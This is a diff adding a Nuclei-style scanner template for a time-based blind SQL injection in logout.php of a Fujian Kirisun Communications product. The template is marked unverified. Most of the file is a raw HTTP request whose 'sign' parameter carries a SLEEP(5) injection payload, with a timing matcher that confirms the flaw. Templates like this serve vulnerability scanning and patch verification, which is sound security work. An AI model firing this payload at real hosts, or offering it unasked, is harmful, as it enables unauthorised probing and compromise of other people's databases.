@@ -1,0 +1,33 @@
+id: kirisun-logout-sqli
+info:
+  name: 福建科立讯通信有限公司 logout.php SQL注入.
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/a09c3778c7df907941342afba5c18f08cd515d9c/%E7%A7%91%E7%AB%8B%E8%AE%AF/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%20logout.php%20SQL%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 对应系统貌似有防护，未成功验证 poc
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,kirisun
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(5)))Vgsc)--+qhh HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          # - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
